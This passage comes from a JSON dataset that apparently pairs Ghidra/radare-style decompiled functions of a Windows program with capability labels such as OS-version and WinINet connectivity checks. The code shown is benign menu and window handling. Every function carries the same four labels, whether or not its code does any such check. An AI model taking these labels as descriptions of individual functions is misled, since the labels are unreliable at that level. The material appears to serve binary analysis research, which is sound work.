        "decompiled_code": "\nvoid __fastcall fcn.004379ac(uint param_1, int32_t param_2)\n\n{\n    uint32_t uVar1;\n    char cVar2;\n    int32_t iVar3;\n    uint32_t uVar4;\n    uint32_t uVar5;\n    int32_t var_18h;\n    uint32_t var_14h;\n    uint32_t var_10h;\n    uint32_t var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    *(param_2 + 0xc) = 0;\n    var_ch = 0xffffffff;\n    var_10h = 0xffffffff;\n    var_14h = 0xffffffff;\n    iVar3 = sub.user32.dll_GetMenuItemCount(*(param_2 + 8));\n    if (-1 < iVar3 + -1) {\n        uVar5 = 0;\n        var_18h = iVar3;\n        do {\n            uVar4 = sub.user32.dll_GetMenuState(*(param_2 + 8), uVar5, 0x400);\n            cVar2 = fcn.00437810(*(param_2 + 4), &stack0xfffffffc);\n            uVar1 = var_10h;\n            if (cVar2 != '\\0') {\n                if ((uVar4 & 2) == 0) {\n                    if (var_ch < 0) {\n                        *(param_2 + 0xc) = 2;\n                        var_ch = uVar5;\n                    }\n                    else {\n                        *(param_2 + 0xc) = 3;\n                    }\n                    uVar1 = uVar5;\n                    if (((uVar4 & 0x80) == 0) && (uVar1 = var_10h,  -1 < var_10h)) {\n                        var_14h = uVar5;\n                    }\n                }\n                else if (var_ch < 0) {\n                    var_ch = 0xfffffffe;\n                }\n            }\n            var_10h = uVar1;\n            uVar5 = uVar5 + 1;\n            var_18h = var_18h + -1;\n        } while (var_18h != 0);\n    }\n    if (var_ch < -1) {\n        *(param_2 + 0xc) = 0x10000;\n    }\n    else {\n        if ((var_ch < 0) && (-1 < iVar3 + -1)) {\n            uVar5 = 0;\n            var_18h = iVar3;\n            do {\n                uVar4 = sub.user32.dll_GetMenuState(*(param_2 + 8), uVar5, 0x400);\n                cVar2 = fcn.0043786c(*(param_2 + 4), &stack0xfffffffc);\n                uVar1 = var_10h;\n                if (cVar2 != '\\0') {\n                    if ((uVar4 & 2) != 0) {\n                        *(param_2 + 0xc) = 0x10000;\n                        return;\n                    }\n                    if (var_ch < 0) {\n                        *(param_2 + 0xc) = 2;\n                        var_ch = uVar5;\n                    }\n                    else {\n                        *(param_2 + 0xc) = 3;\n                    }\n                    uVar1 = uVar5;\n                    if (((uVar4 & 0x80) == 0) && (uVar1 = var_10h,  -1 < var_10h)) {\n                        var_14h = uVar5;\n                    }\n                }\n                var_10h = uVar1;\n                uVar5 = uVar5 + 1;\n                var_18h = var_18h + -1;\n            } while (var_18h != 0);\n        }\n        if (*(param_2 + 0xc) == 2) {\n            *(param_2 + 0xc) = var_ch | 0x20000;\n        }\n        else if (*(param_2 + 0xc) == 3) {\n            if (var_14h < 0) {\n                var_14h = var_ch;\n            }\n            *(param_2 + 0xc) = var_14h | 0x30000;\n        }\n    }\n    return;\n}\n",
        "token_count": 935
    },
    "00437b28": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00437b28(uint uFlags, uint cchMax, uchar *lpString)\n\n{\n    char cVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    uint uVar4;\n    int32_t var_4h;\n    \n    cVar1 = fcn.00436fc0();\n    if (cVar1 == '\\0') {\n        uVar4 = sub.user32.dll_GetMenuStringA();\n    }\n    else {\n        var_4h = 0;\n        uVar2 = sub.user32.dll_GetMenuState();\n        if ((uVar2 & 0x10) == 0) {\n            iVar3 = sub.user32.dll_GetMenuItemID();\n            if (iVar3 != -1) {\n                var_4h = fcn.00436e3c();\n            }\n        }\n        else {\n            sub.user32.dll_GetSubMenu();\n            var_4h = fcn.00436e3c();\n        }\n        if (var_4h == 0) {\n            uVar4 = 0;\n        }\n        else {\n            *lpString = 0;\n            fcn.0040a934();\n            uVar4 = fcn.0040a84c();\n        }\n    }\n    return uVar4;\n}\n",
        "token_count": 281
    },
    "00437bf4": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00437bf4(void)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    \n    if (*(in_EAX + 0x41) != '\\0') {\n        iVar1 = fcn.0044c724();\n        if (iVar1 != 0) {\n            fcn.00437bd0();\n            *(in_EAX + 0x41) = 1;\n        }\n    }\n    return;\n}\n",
        "token_count": 99
    },
    "00437c1c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00437c1c(void)\n\n{\n    int32_t in_EAX;\n    \n    if (*(in_EAX + 0x41) != '\\0') {\n        fcn.004047f0();\n        fcn.00437bd0();\n        *(in_EAX + 0x41) = 1;\n    }\n    return;\n}\n",
        "token_count": 78
    },
    "00437cb0": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00437cb0(uint32_t arg_8h)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    int32_t in_ECX;\n    uint var_4h;\n    \n    if (*(in_EAX + 0x38) != 0) {\n        cVar1 = fcn.004375cc();\n        if (in_ECX == 0) {\n            sub.user32.dll_SendMessageA(*(in_EAX + 0x38), 0xb015, 0, 0);\n        }\n        if (cVar1 != '\\0') {\n            sub.user32.dll_DrawMenuBar(*(in_EAX + 0x38));\n        }\n    }\n    fcn.00437748(arg_8h & 0xff);\n    return;\n}\n",
        "token_count": 173
    },
    "00437dcc": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00437dcc(uint param_1, int32_t *param_2)\n\n{\n    uint8_t uVar1;\n    uchar *puVar2;\n    char cVar3;\n    int32_t in_EAX;\n    int32_t *piVar4;\n    int32_t iVar5;\n    uint uVar6;\n    uint uVar7;\n    uint32_t uVar8;\n    int32_t iVar9;\n    int32_t iVar10;\n    uint32_t *in_FS_OFFSET;\n    uint32_t uStack120;\n    uint uStack116;\n    uchar *puStack112;\n    uint32_t uStack104;\n    uint uStack100;\n    uchar *puStack96;\n    uint32_t uStack92;\n    uint32_t uStack88;\n    uchar *puStack84;\n    uchar *puStack80;\n    uint32_t uStack76;\n    uint uStack72;\n    uchar *puStack68;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    int32_t var_dh;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack68 = &stack0xfffffffc;\n    uStack72 = 0x438300;\n    uStack76 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffb4;\n    iVar9 = *param_2;\n    if (iVar9 < 0x112) {\n        if (iVar9 == 0x111) {\n            iVar9 = *(in_EAX + 8);\n            puStack68 = &stack0xfffffffc;\n            puVar2 = &stack0xfffffffc;\n            if (-1 < iVar9 + -1) {\n                do {\n                    puStack68 = puVar2;\n                    puStack80 = 0x437e4a;\n                    fcn.004197d8();\n                    puStack80 = 0x437e53;\n                    cVar3 = fcn.00436edc();\n                    if (cVar3 != '\\0') goto code_r0x004382ea;\n                    iVar9 = iVar9 + -1;\n                    puVar2 = puStack68;\n                } while (iVar9 != 0);\n            }\n        }\n        else if (iVar9 == 0x2b) {\n            iVar9 = param_2[2];\n            iVar10 = *(in_EAX + 8);\n            puStack68 = &stack0xfffffffc;\n            puVar2 = &stack0xfffffffc;\n            if (-1 < iVar10 + -1) {\n                do {\n                    puStack68 = puVar2;\n                    puStack80 = 0x43805e;\n                    fcn.004197d8();\n                    puStack80 = 0x43806b;\n                    iVar5 = fcn.00436e3c();\n                    if (iVar5 != 0) {\n                        puStack80 = 0x438084;\n                        fcn.0042497c();\n                        puStack84 = 0x438133;\n                        uStack88 = *in_FS_OFFSET;\n                        *in_FS_OFFSET = &stack0xffffffa8;\n                        uStack92 = *(iVar9 + 0x18);\n                        puStack96 = 0x4380a1;\n                        puStack80 = &stack0xfffffffc;\n                        uVar6 = sub.gdi32.dll_SaveDC();\n                        uStack100 = 0x438116;\n                        uStack104 = *in_FS_OFFSET;\n                        *in_FS_OFFSET = &stack0xffffff98;\n                        puStack96 = &stack0xfffffffc;\n                        fcn.00424f48();\n                        fcn.00424ddc();\n                        uVar8 = *(iVar9 + 0x10);\n                        puStack112 = 0x4380ee;\n                        fcn.004385c4(uVar8);\n                        *in_FS_OFFSET = uVar8;\n                        uStack100 = 0x43811d;\n                        uStack104 = 0x438105;\n                        fcn.00424f48();\n                        puStack112 = 0x438115;\n                        uStack104 = uVar6;\n                        sub.gdi32.dll_RestoreDC();\n                        return;\n                    }\n                    iVar10 = iVar10 + -1;\n                    puVar2 = puStack68;\n                } while (iVar10 != 0);\n            }\n        }\n        else if (iVar9 == 0x2c) {\n            iVar9 = param_2[2];\n            iVar10 = *(in_EAX + 8);\n            puStack68 = &stack0xfffffffc;\n            puVar2 = &stack0xfffffffc;\n            if (-1 < iVar10 + -1) {\n                do {\n                    puStack68 = puVar2;\n                    puStack80 = 0x438169;\n                    fcn.004197d8();\n                    puStack80 = 0x438176;\n                    piVar4 = fcn.00436e3c();\n                    if (piVar4 != NULL) {\n                        puStack80 = *(in_EAX + 0x10);\n                        puStack84 = 0x43818f;\n                        uVar6 = sub.user32.dll_GetWindowDC();\n                        uStack88 = 0x438276;\n                        uStack92 = *in_FS_OFFSET;\n                        *in_FS_OFFSET = &stack0xffffffa4;\n                        puStack96 = 0x4381ac;\n                        puStack84 = &stack0xfffffffc;\n                        fcn.0042497c();\n                        uStack100 = 0x438251;\n                        uStack104 = *in_FS_OFFSET;\n                        *in_FS_OFFSET = &stack0xffffff98;\n                        puStack112 = 0x4381c6;\n                        puStack96 = &stack0xfffffffc;\n                        uVar7 = sub.gdi32.dll_SaveDC();\n                        uStack116 = 0x438234;\n                        uStack120 = *in_FS_OFFSET;\n                        *in_FS_OFFSET = &stack0xffffff88;\n                        puStack112 = &stack0xfffffffc;\n                        fcn.00424f48();\n                        fcn.00424ddc();\n                        uVar8 = iVar9 + 0x10;\n                        (**(*piVar4 + 0x38))();\n                        *in_FS_OFFSET = uVar8;\n                        uStack116 = 0x43823b;\n                        uStack120 = 0x438226;\n                        fcn.00424f48();\n                        uStack120 = uVar7;\n                        sub.gdi32.dll_RestoreDC(uVar6);\n                        return;\n                    }\n                    iVar10 = iVar10 + -1;\n                    puVar2 = puStack68;\n                } while (iVar10 != 0);\n            }\n        }\n        else if (iVar9 == 0x53) {\n            iVar9 = param_2[2];\n            iVar10 = *(in_EAX + 8);\n            puStack68 = &stack0xfffffffc;\n            puVar2 = &stack0xfffffffc;\n            if (-1 < iVar10 + -1) {\n                do {\n                    puStack68 = puVar2;\n                    puStack80 = 0x437f5c;\n                    piVar4 = fcn.004197d8();\n                    puStack80 = 0x437f61;\n                    iVar5 = (**(*piVar4 + 0x34))();\n                    if (iVar5 == *(iVar9 + 0xc)) {\n                        puStack80 = 0x437f73;\n                        iVar5 = fcn.004197d8();\n                        unique0x00007a00 = *(iVar5 + 0x34);\n                    }\n                    else {\n                        puStack80 = 0x437f85;\n                        fcn.004197d8();\n                        puStack80 = 0x437f92;\n                        *NULL = fcn.00436e3c();\n                    }\n                    if (stack0xfffffff0 != 0) {\n                        puStack80 = 0x437fa9;\n                        fcn.004197d8();\n                        puStack80 = 0x437fb6;\n                        iVar9 = fcn.00436e6c();\n                        if (iVar9 == 0) {\n                            puStack80 = 0x437fc4;\n                            fcn.004197d8();\n                            puStack80 = 0x437fd1;\n                            fcn.00436e6c();\n                        }\n                        if (*(**0x492ad4 + 0x6c) != 0) {\n                            if ((*(*(**0x492ad4 + 0x6c) + 0x270) & 8) == 0) {\n                                puStack80 = 0x43802a;\n                                fcn.0044613c();\n                            }\n                            else {\n                                puStack80 = 0x438017;\n                                fcn.004461c4();\n                            }\n                        }\n                        goto code_r0x004382ea;\n                    }\n                    iVar10 = iVar10 + -1;\n                    puVar2 = puStack68;\n                } while (iVar10 != 0);\n            }\n        }\n    }\n    else if (iVar9 == 0x117) {\n        iVar9 = *(in_EAX + 8);\n        puStack68 = &stack0xfffffffc;\n        puVar2 = &stack0xfffffffc;\n        if (-1 < iVar9 + -1) {\n            do {\n                puStack68 = puVar2;\n                puStack80 = 0x437e80;\n                fcn.004197d8();\n                puStack80 = 0x437e88;\n                cVar3 = fcn.00436ef8();\n                if (cVar3 != '\\0') goto code_r0x004382ea;\n                iVar9 = iVar9 + -1;\n                puVar2 = puStack68;\n            } while (iVar9 != 0);\n        }\n    }\n    else if (iVar9 == 0x11f) {\n        uVar1 = *(param_2 + 6);\n        iVar9 = *(in_EAX + 8);\n        puStack68 = &stack0xfffffffc;\n        puVar2 = &stack0xfffffffc;\n        if (-1 < iVar9 + -1) {\n            do {\n                puStack68 = puVar2;\n                if (((uVar1 & 0x10) != 0) && (param_2[2] != 0)) {\n                    puStack80 = *(param_2 + 1);\n                    uStack88 = 0x437ecd;\n                    uStack76 = param_2[2];\n                    sub.user32.dll_GetSubMenu();\n                }\n                puStack80 = 0x437eec;\n                fcn.004197d8();\n                puStack80 = 0x437ef8;\n                iVar10 = fcn.00436e3c();\n                if (iVar10 != 0) {\n                    puStack80 = 0x437f0f;\n                    fcn.0044c9d8();\n                    puStack80 = 0x437f1e;\n                    fcn.00446504();\n                    goto code_r0x004382ea;\n                }\n                iVar9 = iVar9 + -1;\n                puVar2 = puStack68;\n            } while (iVar9 != 0);\n        }\n        puStack80 = 0x437f35;\n        fcn.00446504();\n    }\n    else {\n        puStack68 = &stack0xfffffffc;\n        if ((iVar9 == 0x120) &&\n           (iVar9 = *(in_EAX + 8),  puStack68 = &stack0xfffffffc,  puVar2 = &stack0xfffffffc,  -1 < iVar9 + -1)) {\n            do {\n                puStack68 = puVar2;\n                puStack80 = 0x43829f;\n                piVar4 = fcn.004197d8();\n                puStack80 = 0x4382aa;\n                iVar10 = (**(*piVar4 + 0x34))();\n                if (iVar10 == param_2[2]) {\ncode_r0x004382c0:\n                    puStack80 = 0x4382ca;\n                    fcn.004379ac();\n                    goto code_r0x004382ea;\n                }\n                puStack80 = 0x4382bc;\n                iVar10 = fcn.00436e3c();\n                if (iVar10 != 0) goto code_r0x004382c0;\n                iVar9 = iVar9 + -1;\n                puVar2 = puStack68;\n            } while (iVar9 != 0);\n        }\n    }\n    puStack80 = param_2[2];\n    puStack84 = param_2[1];\n    uStack88 = *param_2;\n    uStack76 = *(in_EAX + 0x10);\n    puStack96 = 0x4382e7;\n    iVar9 = sub.user32.dll_DefWindowProcA();\n    param_2[3] = iVar9;\ncode_r0x004382ea:\n    *in_FS_OFFSET = uStack76;\n    puStack68 = 0x438307;\n    uStack72 = 0x4382ff;\n    fcn.0040546c();\n    return;\n}\n",
        "token_count": 2885
    },
    "00438310": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00438310(void)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    \n    if (*(in_EAX + 8) == 0) {\n        uVar1 = fcn.004209b4(fcn.00437d80, in_EAX);\n        *(in_EAX + 0x10) = uVar1;\n    }\n    fcn.00419680();\n    return;\n}\n",
        "token_count": 95
    },
    "00438338": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00438338(void)\n\n{\n    int32_t in_EAX;\n    \n    fcn.0041991c();\n    if (*(in_EAX + 8) == 0) {\n        fcn.00420a68();\n    }\n    return;\n}\n",
        "token_count": 59
    },
    "00438420": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00438420(void)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    \n    if ((*(*0x492b04 + 0xd) != '\\0') && (*(in_EAX + 0x41) != '\\0')) {\n        iVar1 = fcn.00432e70();\n        if (iVar1 == 0) {\n            fcn.00437bd0();\n            *(in_EAX + 0x41) = 1;\n        }\n        else {\n            fcn.00437bd0();\n            *(in_EAX + 0x41) = 1;\n        }\n    }\n    return;\n}\n",
        "token_count": 144
    },
    "0043846c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint32_t fcn.0043846c(void)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    uint32_t uVar2;\n    \n    uVar2 = 0;\n    if (*(*0x492b04 + 0xd) != '\\0') {\n        if (*(in_EAX + 0x41) == '\\0') {\n            uVar2 = *(in_EAX + 0x30) == '\\x01';\n        }\n        else {\n            iVar1 = fcn.00432e70();\n            if (iVar1 == 0) {\n                uVar2 = fcn.00444b80();\n            }\n            else {\n                uVar2 = fcn.0040483c();\n            }\n        }\n    }\n    return uVar2;\n}\n",
        "token_count": 173
    },
    "0043abf0": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0043abf0(void)\n\n{\n    uint8_t uVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    uint8_t uVar3;\n    uint8_t uStack51;\n    uint8_t uStack50;\n    char cStack40;\n    \n    sub.user32.dll_GetWindowLongA();\n    iVar2 = sub.user32.dll_IsIconic();\n    uVar3 = 1 - (iVar2 == 0);\n    iVar2 = sub.user32.dll_IsWindowVisible();\n    if ((iVar2 == 0) && ((in_EAX != *(*0x497c14 + 0x30) || (*(*0x497c14 + 0x5b) == '\\0')))) {\n        uVar1 = 0;\n    }\n    else {\n        uVar1 = 1;\n    }\n    if ((uVar1 | uVar3) != 0) {\n        cStack40 = in_EAX;\n        sub.user32.dll_ShowWindow();\n    }\n    if (cStack40 == '\\0') {\n        sub.user32.dll_SetWindowLongA();\n    }\n    else {\n        sub.user32.dll_SetWindowLongA();\n    }\n    uStack51 = in_EAX >> 8;\n    uStack50 = in_EAX >> 0x10;\n    if (((uStack51 & uStack50) != 0) || (uVar3 != 0)) {\n        if (uVar3 == 0) {\n            sub.user32.dll_ShowWindow();\n        }\n        else {\n            sub.user32.dll_ShowWindow();\n        }\n    }\n    return;\n}\n",
        "token_count": 351
    },
    "0043acb0": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0043acb0(void)\n\n{\n    if (*(*0x497c14 + 0x30) != 0) {\n        fcn.00444a04();\n    }\n    fcn.004461cc();\n    fcn.0041faec();\n    fcn.0041fa90();\n    return;\n}\n",
        "token_count": 73
    },
    "0043ae34": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0043ae34(int32_t arg_8h)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    \n    if ((arg_8h != *0x4914f8) && (arg_8h != *(*0x497c14 + 0x30))) {\n        iVar1 = sub.user32.dll_IsWindowVisible(arg_8h);\n        if (iVar1 != 0) {\n            iVar1 = sub.user32.dll_IsWindowEnabled(arg_8h);\n            if (iVar1 != 0) {\n                uVar2 = sub.user32.dll_GetWindowLongA(arg_8h, 0xffffffec);\n                if ((uVar2 & 8) == 0) {\n                    if (*0x4914fc == 0) {\n                        *0x4914fc = arg_8h;\n                    }\n                }\n                else if (*0x491500 == 0) {\n                    *0x491500 = arg_8h;\n                }\n            }\n        }\n    }\n    return 0xffffffff;\n}\n",
        "token_count": 232
    },
    "0043ae98": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t fcn.0043ae98(void)\n\n{\n    uint in_EAX;\n    uint uVar1;\n    \n    *0x4914fc = 0;\n    *0x491500 = 0;\n    *0x4914f8 = in_EAX;\n    uVar1 = sub.kernel32.dll_GetCurrentThreadId_1(fcn.0043ae34, 0);\n    sub.user32.dll_EnumThreadWindows(uVar1);\n    if (*0x4914fc != 0) {\n        return *0x4914fc;\n    }\n    return *0x491500;\n}\n",
        "token_count": 132
    },
    "0043b164": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.0043b164(uint param_1, char param_2)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    \n    do {\n        if (param_2 == '\\0') {\n            cVar1 = fcn.004047cc();\n            if (cVar1 != '\\0') {\ncode_r0x0043b18a:\n                cVar1 = fcn.004047cc();\n                if (cVar1 != '\\0') {\n                    return in_EAX;\n                }\n                return 0;\n            }\n        }\n        if (*(in_EAX + 0x30) == 0) goto code_r0x0043b18a;\n        in_EAX = *(in_EAX + 0x30);\n    } while( true );\n}\n",
        "token_count": 175
    },
    "0043b31c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0043b31c(void)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    \n    if (*(in_EAX + 0x18) == '\\0') {\n        cVar1 = fcn.0043b4dc();\n        if (cVar1 != '\\0') {\n            cVar1 = fcn.004503c8();\n            if (cVar1 == '\\0') {\n                fcn.0043ba34();\n            }\n            else {\n                fcn.0043ba34();\n            }\n        }\n    }\n    return;\n}\n",
        "token_count": 127
    },
    "0043b354": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0043b354(int32_t arg_8h)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    int32_t iVar3;\n    \n    if (*(in_EAX + 0x57) != '\\0') {\n        cVar1 = *(in_EAX + 0x5b);\n        if ((cVar1 == '\\0') || (cVar1 == '\\x03')) {\n            if ((*(in_EAX + 0x5b) == '\\x03') || (*0x43b3c0 == (*0x43b3bc & *(in_EAX + 0x61)))) {\n                iVar3 = *(*(arg_8h + -8) + 0xc) + *(in_EAX + 0x40) + *(in_EAX + 0x48);\n                iVar2 = *(arg_8h + -4);\n                if (*(arg_8h + -4) <= iVar3) {\n                    iVar2 = iVar3;\n                }\n                *(arg_8h + -4) = iVar2;\n            }\n        }\n        else if (cVar1 == '\\x04') {\n            *(arg_8h + -0xc) = *(arg_8h + -0xc) + *(in_EAX + 0x48);\n        }\n    }\n    return;\n}\n",
        "token_count": 302
    },
    "0043b3c4": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0043b3c4(int32_t arg_8h)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    int32_t iVar2;\n    \n    if (*(in_EAX + 0x57) != '\\0') {\n        if (*(in_EAX + 0x5b) < 2) {\n            if ((*(in_EAX + 0x5b) == '\\x01') || (*0x43b42c == (*0x43b428 & *(in_EAX + 0x61)))) {\n                iVar2 = *(*(arg_8h + -8) + 0xc) + *(in_EAX + 0x44) + *(in_EAX + 0x4c);\n                iVar1 = *(arg_8h + -4);\n                if (*(arg_8h + -4) <= iVar2) {\n                    iVar1 = iVar2;\n                }\n                *(arg_8h + -4) = iVar1;\n            }\n        }\n        else if (*(in_EAX + 0x5b) == 2) {\n            *(arg_8h + -0xc) = *(arg_8h + -0xc) + *(in_EAX + 0x4c);\n        }\n    }\n    return;\n}\n",
        "token_count": 285
    },
    "0043b430": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0043b430(void)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    uchar *puVar3;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    if (*(*(in_EAX + 4) + 0x96) != '\\0') {\n        cVar1 = (**(**(in_EAX + 4) + 0xd8))();\n        if (cVar1 == '\\0') {\n            fcn.0043bb6c();\n        }\n        else {\n            iVar2 = fcn.00453b18();\n            if (-1 < iVar2 + -1) {\n                do {\n                    if (*(in_EAX + 0x18) == '\\0') {\n                        puVar3 = &stack0xfffffffc;\n                        fcn.00453adc();\n                        fcn.0043b354(puVar3);\n                    }\n                    else {\n                        puVar3 = &stack0xfffffffc;\n                        fcn.00453adc();\n                        fcn.0043b3c4(puVar3);\n                    }\n                    iVar2 = iVar2 + -1;\n                } while (iVar2 != 0);\n            }\n            fcn.0043bb6c();\n        }\n    }\n    return;\n}\n",
        "token_count": 287
    },
    "0043b4dc": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint fcn.0043b4dc(void)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    \n    uVar3 = 0x100000;\n    if (*(in_EAX + 0x18) == '\\x01') {\n        uVar3 = 0x200000;\n    }\n    if (*(in_EAX + 0x1c) != '\\0') {\n        uVar1 = fcn.00457a28(0xfffffff0);\n        uVar2 = sub.user32.dll_GetWindowLongA(uVar1);\n        if ((uVar2 & uVar3) != 0) {\n            return 1;\n        }\n    }\n    return 0;\n}\n",
        "token_count": 170
    },
    "0043b548": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.0043b548(int32_t arg_8h)\n\n{\n    char cVar1;\n    ushort in_DX;\n    int32_t iVar2;\n    \n    iVar2 = 0;\n    if (*(arg_8h + -5) == '\\0') {\n        if ((*(arg_8h + -6) != '\\0') && (cVar1 = fcn.0043b514(arg_8h),  cVar1 == '\\0')) {\n            iVar2 = (***0x492750)(in_DX);\n            return -(iVar2 - *(arg_8h + -0xc));\n        }\n        if ((*(arg_8h + -6) == '\\0') && (cVar1 = fcn.0043b514(arg_8h),  cVar1 != '\\0')) {\n            iVar2 = (***0x492750)(in_DX);\n            iVar2 = iVar2 - *(arg_8h + -0xc);\n        }\n    }\n    return iVar2;\n}\n",
        "token_count": 223
    },
    "0043ba34": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
